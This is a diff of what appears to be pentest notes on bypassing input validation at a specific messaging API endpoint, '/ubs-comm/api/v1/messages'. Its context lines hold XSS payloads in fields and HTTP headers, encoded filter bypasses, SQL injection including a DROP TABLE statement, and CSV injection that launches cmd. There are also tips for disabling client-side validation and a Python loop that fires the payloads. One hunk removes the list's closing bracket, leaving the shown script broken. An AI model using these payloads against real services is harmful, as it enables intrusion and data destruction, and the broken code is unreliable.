@@ -54,7 +54,6 @@ Content-Type: text/plain
 Content-Type: application/xml
 Content-Type: text/xml
 
-text
 
 ---
 
@@ -69,7 +68,6 @@ Mixed encoding examples
 %27%22 (single quote + double quote encoded)
 %27%3C (single quote + less than)
 
-text
 
 ---
 
@@ -82,7 +80,6 @@ POST /ubs-comm/api/v1/messages
 Or use URL encoding
 messageText=test'&messageText=<script>
 
-text
 
 ---
 
@@ -94,7 +91,6 @@ User-Agent: <script>alert(1)</script>
 Referer: javascript:alert(1)
 X-Custom-Header: <img src=x onerror=alert(1)>
 
-text
 
 ---
 
@@ -126,14 +122,12 @@ text
 {"messageText": "test' UNION SELECT null,null,null--'"}
 {"messageText": "test'; DROP TABLE users;--'"}
 
-text
 
 ### CSV Injection with comma:
 
 {"messageText": "=cmd|'/c calc'!A0,=cmd|'/c notepad'!A0"}
 {"messageText": "@SUM(1+1)*cmd|' /C calc'!A0,test"}
 
-text
 
 ---
 
@@ -145,7 +139,6 @@ Try intercepting and modifying the response:
 // Modify JavaScript to allow special characters
 // Or disable validation entirely
 
-text
 
 ---
 
@@ -161,7 +154,6 @@ bypasses = [
 "%3Cscript%3E",
 "%22%3Cscript%3E",
 
-text
     # Double encoded  
     "%253Cscript%253E",
     "%2522%253Cscript%253E",
@@ -188,7 +180,6 @@ text
     # CSV injection
     "=cmd|'/c calc'!A0",
     "@SUM(1+1)*cmd|' /C calc'!A0"
-]
 
 for bypass in bypasses:
     payload = base_payload.copy()
@@ -209,7 +200,6 @@ for bypass in bypasses:
     print("-" * 50)
 test_bypasses()
 
-text
 
 ---
 
